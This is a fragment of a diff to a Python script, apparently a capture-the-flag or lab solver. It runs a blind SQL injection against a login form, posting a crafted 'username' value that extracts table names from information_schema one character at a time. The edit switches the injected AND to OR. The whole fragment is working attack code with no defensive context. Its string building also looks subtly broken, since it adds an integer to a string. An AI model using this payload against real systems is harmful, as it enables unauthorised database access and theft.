@@ -445,7 +445,7 @@
   	flag = 0
   	for x in char:
   		data = {
-  			'username' : "admin' AND (SELECT SUBSTRING(table_name,"+len(listpass)+1+",1) = '"+x+"' FROM information_schema.tables WHERE table_schema not in ('information_schema', 'mysql', 'performance_schema') LIMIT 1)"
+  			'username' : "admin' OR (SELECT SUBSTRING(table_name,"+len(listpass)+1+",1) = '"+x+"' FROM information_schema.tables WHERE table_schema not in ('information_schema', 'mysql', 'performance_schema') LIMIT 1)"
   		}
   
   		response = requests.post(url, data = data)
